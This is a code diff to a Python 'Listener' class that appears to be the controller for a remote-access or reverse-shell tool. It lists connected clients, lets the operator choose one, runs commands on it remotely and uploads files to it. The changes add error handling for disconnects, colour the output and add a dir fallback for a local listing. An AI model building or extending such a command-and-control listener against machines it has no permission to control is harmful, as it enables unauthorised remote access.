@@ -77,8 +77,11 @@ class Listener:
 
 
 	def execute_remotely(self, command):
-		self.reliable_send(command)
-		return self.reliable_recive()
+		try:
+			self.reliable_send(command)
+			return self.reliable_recive()
+		except:
+			return "[-] This client has been disconnected"
 
 
 	def get_connections(self):
@@ -135,7 +138,7 @@ class Listener:
 				help_message = colored("\n Type 'help' to see it\n\n", "yellow")
 				help_message += colored(" print", "green") + " - show all connections;\n"
 				help_message += colored(" choose", "green") + " - choose connection;\n"
-				help_message += colored("l ls", "green") + " - execute ls on own machine;\n"
+				help_message += colored(" l ls", "green") + " - execute ls on own machine;\n"
 				help_message += colored(" exit", "red") + " - stop the program; \n"
 				print(help_message)
 
@@ -170,13 +173,15 @@ class Listener:
 					if os.path.exists(file_name):
 						file = self.read_file(file_name)
 						res = self.execute_remotely(f"upload {file_name}, {file}")
-						print(colored(res, "green"))
+						if res.split()[0] != "[-]": print(colored(res, "green"))
+						else: print(colored(res, "red"))
 					else:
 						print(colored("[-] This file is not exists", "red"))
 				else: print(colored("[-] You didn't choose any connection yet", "red"))
 
 			elif command.strip() and command.split()[0] == "l" and command.split()[1] == "ls":
-				res = UkDecode(subprocess.check_output("ls", shell = True))
+				try: res = UkDecode(subprocess.check_output("ls", shell = True))
+				except: res = UkDecode(subprocess.check_output("dir", shell = True))
 				print(res)
 
 
